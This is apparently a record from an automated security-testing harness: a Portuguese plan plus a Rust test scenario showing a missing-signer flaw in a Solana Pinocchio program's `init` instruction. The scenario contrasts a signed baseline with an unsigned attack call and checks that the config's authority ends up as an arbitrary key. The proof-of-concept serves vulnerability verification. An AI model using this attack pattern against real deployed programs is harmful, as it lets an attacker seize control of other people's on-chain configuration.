attempts.raw:
{
  "plan": "O programa `init` (Pinocchio) grava a chave de `accounts[1]` como autoridade da config sem verificar `is_signer`. Vou montar uma conta `config` mutável (não inicializada, byte 40 = 0) e uma conta `authority` que NÃO assina, com uma chave pública arbitrária. O baseline legítimo chama `init` com a authority assinando; o ataque chama a mesma instrução com a authority sem assinar. O efeito medido é que a config foi inicializada (byte 40 = 1) e a autoridade gravada é a chave do atacante, apesar da ausência de assinatura.",
  "scenario": "let config_key = Pubkey::new_unique();
let authority_key = Pubkey::new_unique();

let config_data = vec![0u8; 49];
let config_account = account(&env.program_id, &config_data, None);
let authority_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_key, true),
];
let ix = env.raw_ix(&[IX_INIT], metas);
let contas = vec![
    (config_key, config_account.clone()),
    (authority_key, authority_account.clone()),
];

let baseline = env.baseline("init legitimo com authority assinando", &ix, &contas);

let metas_ataque = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_key, false),
];
let ix_ataque = env.raw_ix(&[IX_INIT], metas_ataque);
let contas_ataque = vec![
    (config_key, config_account),
    (authority_key, authority_account),
];

let r = env.attack("init sem assinatura da authority", &ix_ataque, &contas_ataque);
if r.program_result == ProgramResult::Success {
    let cfg = after(&r, &config_key);
    let dados = cfg.data();
    let inicializada = dados[40] == 1;
    let autoridade_gravada = read_pubkey(dados, 8) == authority_key;
    env.effect("config inicializada sem assinatura da authority", inicializada && autoridade_gravada);
}"
}

